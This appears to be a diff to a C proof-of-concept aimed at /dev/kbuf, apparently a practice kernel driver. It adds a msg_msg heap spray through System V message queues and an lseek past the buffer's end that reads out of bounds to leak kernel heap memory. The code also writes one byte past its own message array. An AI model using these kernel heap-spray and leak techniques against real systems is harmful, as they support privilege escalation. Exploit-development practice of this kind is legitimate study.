@@ -6,6 +6,8 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <sys/syscall.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
 
 #ifndef HEXDUMP_COLS
 #define HEXDUMP_COLS 16
@@ -58,9 +60,27 @@ void hexdump(void *mem, unsigned int len)
 
 char* buf[0x100] = {0,};
 
+
+// msg_msg
+#define BUF_SIZE 0x800 - 0x30
+struct {
+	long mtype;
+	char mtext[BUF_SIZE];
+}msg;
+
+void spray(){
+	memset(msg.mtext, 0x42, BUF_SIZE - 1);
+	msg.mtext[BUF_SIZE] = 0;
+	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
+	msg.mtype = 1;
+
+	msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
+}
+
 int main(){
     int fd = open("/dev/kbuf", O_RDWR);
-    lseek(fd, -0x100, SEEK_END);
+	spray();
+    lseek(fd, 0x30, SEEK_END);
     read(fd, buf, 0x100);
     hexdump(buf, 0x100);
 }
